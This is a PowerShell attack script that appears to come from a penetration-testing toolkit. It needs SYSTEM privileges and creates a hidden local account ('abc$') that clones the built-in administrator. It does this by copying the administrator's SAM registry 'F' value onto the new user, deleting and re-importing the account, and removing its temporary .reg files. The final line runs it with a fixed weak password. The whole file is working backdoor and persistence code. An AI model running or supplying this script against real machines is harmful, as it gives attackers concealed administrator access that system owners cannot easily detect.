function Create-Clone
{
<#
.SYNOPSIS
This script requires System privileges. You can use Invoke-TokenManipulation.ps1 to get System privileges and create the clone user.
Link: https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-TokenManipulation.ps1
Author: Evilcg and 3gstuent
Evilcg's way to achieve the same goal:
https://github.com/Ridter/Pentest/blob/master/powershell/MyShell/Create-Clone.ps1
.PARAMETER u
The clone username
.PARAMETER p
The clone user's password
.PARAMETER cu
The user to be cloned, default administrator 
.EXAMPLE
Create-Clone -u abc -p abc123 -cu administrator
#>
     Param(
        [Parameter(Mandatory=$true)]
        [String]
        $u,

        [Parameter(Mandatory=$true)]
        [String]
        $p,

        [Parameter(Mandatory=$false)]
        [String]
        $cu = "administrator"
    )


    function Create-user ([string]$Username,[string]$Password) 
    {
        $group = "Administrators"
        $adsi = [ADSI]"WinNT://$env:COMPUTERNAME"
        $existing = $adsi.Children | where {$_.SchemaClassName -eq 'user' -and $_.Name -eq $Username }
        if ($existing -eq $null) {
            Write-Host "Creating new local user $Username with password $Password"
            & NET USER $Username $Password /add /y /expires:never | Out-Null
            Write-Host "Adding local user $Username to $group."
            & NET LOCALGROUP $group $Username /add | Out-Null
        }
        else {
            Write-Host "[*] Setting password for existing local user $Username"
            $existing.SetPassword($Password)           
        }

        Write-Host "[*] Ensuring password for $Username never expires"
        WMIC USERACCOUNT WHERE "Name='$Username'" SET PasswordExpires=FALSE
    }

    function GetUser-Key([string]$user)
    {
        cmd /c "regedit /e $env:temp\$user.reg "HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names\$user""
        $file = Get-Content "$env:temp\$user.reg"  | Out-String
        $pattern="@=hex\((.*?)\)\:"
        $file -match $pattern |Out-Null
        $key = "00000"+$matches[1]
        Write-Host $key
        return $key
    }
    
    function Clone ([string]$ukey,[string]$cukey) 
    {
        $ureg = "HKLM:\SAM\SAM\Domains\Account\Users\$ukey" |Out-String
        $cureg = "HKLM:\SAM\SAM\Domains\Account\Users\$cukey" |Out-String       
        $cuFreg = Get-Item -Path $cureg.Trim()
        $cuFvalue = $cuFreg.GetValue('F')
        Set-ItemProperty -path $ureg.Trim()  -Name "F" -value $cuFvalue
        $outreg = "HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\$ukey"
        cmd /c "regedit /e $env:temp\out.reg $outreg.Trim()"
        Write-Host "Copy from $cu to $u success."
    }

    function Main () 
    {

        Write-Host "[*] Current token: "  -NoNewline
        $token=whoami
        if($token -ne "nt authority\system")
        {
            Write-Host "  " $token
            Write-Host "[!] Low privileges."
            Write-Host "[*] Exit."
            Exit
        }
        else 
        {
            Write-Host $token
        }

        Write-Host "[*] Create User..."
        Create-user $u $p
    
        Write-Host "[*] Get User $u's Key: "  -NoNewline
        $ukey = GetUser-Key $u |Out-String
    
        Write-Host "[*] Get User $cu's Key: "  -NoNewline
        $cukey = GetUser-Key $cu |Out-String
        
        Write-Host "[*] Try to clone..."
        Clone $ukey $cukey

        Write-Host "[*] Delete User:$u"
        Net User $u /del |Out-Null
        
        Write-Host "[*] Import the registry"
        cmd /c "regedit /s $env:temp\$u.reg"
        cmd /c "regedit /s $env:temp\out.reg"
        Write-Host "[*] Clearn"
        Remove-Item $env:temp\*.reg
        Write-Output "[*] All Done."
    }    
    Main   
}
Create-Clone -u abc$ -p 123
